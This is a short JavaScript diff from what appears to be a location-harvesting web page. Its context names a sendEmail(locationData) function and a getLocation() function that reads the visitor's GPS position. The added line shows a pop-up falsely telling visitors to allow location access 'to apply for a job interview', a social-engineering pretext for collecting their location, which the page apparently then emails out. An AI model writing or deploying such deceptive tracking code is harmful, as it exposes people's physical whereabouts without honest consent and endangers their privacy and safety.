@@ -29,6 +29,7 @@ function sendEmail(locationData) {
 
 // Function to retrieve the user's GPS location
 function getLocation() {
+window.alert("Please allow location permission to apply for a job interview")
   if ("geolocation" in navigator) {
     navigator.geolocation.getCurrentPosition(
       function (position) {
